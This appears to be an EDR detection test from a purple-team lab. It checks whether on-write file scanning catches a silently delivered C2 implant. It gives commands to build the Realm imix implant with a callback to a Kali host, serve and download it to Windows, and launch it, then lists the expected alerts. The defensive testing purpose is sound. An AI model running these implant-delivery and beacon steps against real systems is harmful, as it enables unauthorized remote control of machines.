# Test: Delivery — direct copy (no invocation telemetry)

**Chain:** implant arrives by file copy (share, RDP clipboard, "already exfiltrated").
No suspicious command line exists — the **on-write file scan is the only tripwire**. This
test proves your detection doesn't depend on delivery being noisy.

**Implant setup — creation to the Windows machine (do once before the test):**

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build the implant (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: build with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant on the machine + prep the EDR** (elevated PowerShell):
```powershell
Invoke-WebRequest http://172.16.69.109:8000/sysupd.exe -OutFile C:\Users\Public\sysupd.exe
# EDR running + fresh persistence baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```
These drops themselves should already fire `SIG-REALM-IMIX` / `SIG-RUST-IMPLANT`
(on-write scan) — delivery detection working before the test even starts.
Full reference: [`../_common/implant-build.md`](../_common/implant-build.md).

serve + `Invoke-WebRequest` without encoding.

**Victim (elevated PowerShell):**

```powershell
Copy-Item \\172.16.69.109\realm-share\sysupd.exe C:\Users\Public\sysupd.exe   # or IWR, plain
Start-Sleep 65                                              # one scan interval
Start-Process C:\Users\Public\sysupd.exe
```

**Expected alerts:**

| Rule | Sev | Trigger |
|---|---|---|
| `SIG-REALM-IMPLANT` / `SIG-RUST-IMPLANT` | crit/high | signature scan finds the bytes in a scanned root |
| `EVT-4688-TEMP` | high | launch from \Users\Public (kernel-fed, fast) |
| `PROG-IMPLANT-LAUNCH` | critical | WMI-poll image scan (≤3s later) |
| `NET-BEACON` | critical | callbacks |

**The point:** delivery was silent — everything fired from the *artifact* + *launch*, not
from a suspicious downloader. If nothing fires before the launch, your on-write scanning
gap is the finding.

**Cleanup:** `..\..\poc-scripts\victim\05-full-cleanup.ps1`
